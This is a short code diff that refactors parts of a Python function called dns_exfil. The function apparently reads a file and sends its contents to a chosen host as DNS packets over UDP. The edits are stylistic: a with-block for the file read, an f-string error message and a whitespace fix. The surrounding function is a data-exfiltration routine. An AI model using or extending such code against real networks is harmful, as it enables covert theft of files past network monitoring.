@@ -65,9 +65,8 @@ def dns_exfil(host, path_to_file, port=53, max_packet_size=128, time_delay=0.01)
 
 	# Read file
 	try:
-		fh = open(path_to_file, READ_BINARY)
-		exfil_me = fh.read()
-		fh.close()
+		with open(path_to_file, READ_BINARY) as fh:
+			exfil_me = fh.read()
 	except:
 		sys.stderr.write("Problem with reading file. ")
 		return -1
@@ -77,7 +76,9 @@ def dns_exfil(host, path_to_file, port=53, max_packet_size=128, time_delay=0.01)
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	except socket.error as msg:
-		sys.stderr.write('Failed to create socket. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
+		sys.stderr.write(
+			f'Failed to create socket. Error Code : {str(msg[0])} Message {msg[1]}'
+		)
 		return -1
 
 	# Initiation packet:
@@ -98,7 +99,7 @@ def dns_exfil(host, path_to_file, port=53, max_packet_size=128, time_delay=0.01)
 	dns_request = build_dns(host)
 	dns_request += DATA_TERMINATOR + NULL + DATA_TERMINATOR
 	s.sendto(dns_request, addr)
-	
+
 	return 0
 
 
